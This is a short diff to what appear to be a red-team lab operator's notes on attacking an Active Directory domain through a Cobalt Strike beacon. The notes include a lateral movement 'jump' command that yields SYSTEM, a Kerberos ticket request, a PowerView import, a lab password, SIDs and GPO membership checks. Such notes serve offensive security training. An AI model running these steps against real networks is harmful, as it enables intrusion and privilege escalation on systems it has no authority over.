@@ -51,3 +51,15 @@ beacon> jump scshell64 LON-DC-1 smb
 
 and we got system!
 
+krb_asktgs /service:ldap/enc-dc-1.contoso.enclave /targetdomain:contoso.enclave /dc:enc-dc-1.contoso.enclave /ticket:
+
+beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
+
+bloodhound - Passw0rd!@!!
+enc-fs-1 S-1-5-21-1330904164-3792538338-293942156
+enclave acces S-1-5-21-1076548718-1118529210-2193484809-2601
+
+lets check the GPO for enclave access
+0FF094F9-69ED-476D-8DCB-1820DE60A666
+*S-1-5-21-1330904164-3792538338-293942156-2103__Memberof = *S-1-5-32-544
+okay so admin over JMP?
